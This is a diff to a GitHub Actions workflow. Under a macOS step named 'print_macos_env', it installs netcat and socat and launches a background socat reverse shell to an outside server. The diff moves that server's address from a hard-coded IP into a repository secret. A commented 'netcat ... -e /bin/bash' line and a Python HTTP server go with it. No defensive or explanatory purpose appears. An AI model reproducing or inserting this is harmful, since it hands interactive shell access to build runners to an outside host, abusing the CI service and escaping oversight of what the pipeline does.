@@ -8,6 +8,8 @@ jobs:
     runs-on: macos-latest
     steps:
       - name: print_macos_env
+        env:
+          PUBLIC_SERVER_IP: ${{ secrets.PUBLIC_SERVER }}
         run: |
           uname -a
           xcrun -f clang
@@ -26,8 +28,8 @@ jobs:
           echo "-----> done "
           # xcrun python3 -m http.server 8888 
           brew install sshpass netcat wget socat #dropbear openssh rlwrap
-          # netcat 139.199.225.147 2333 -e /bin/bash
-          nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:139.199.225.147:2222 &
+          # netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash
+          nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2222 &
           xcrun python3 -m http.server 8888
 
   linux-test-jb:
